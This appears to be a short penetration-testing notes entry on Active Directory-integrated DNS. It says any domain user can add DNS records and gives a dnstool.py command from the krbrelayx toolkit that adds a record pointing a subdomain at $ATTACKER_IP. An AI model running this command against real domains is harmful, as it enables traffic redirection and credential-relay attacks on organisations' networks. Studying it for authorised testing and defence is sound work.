## DNS
active directory DNS is dynamic DNS.
any domain user can add a DNS record.

### adding DNS records
https://github.com/dirkjanm/krbrelayx
dnstool.py
```bash
python3 dnstool.py -u 'domain.local\username' -p password123 -a add -r subdomain.domain.local -d $ATTACKER_IP $IP
```

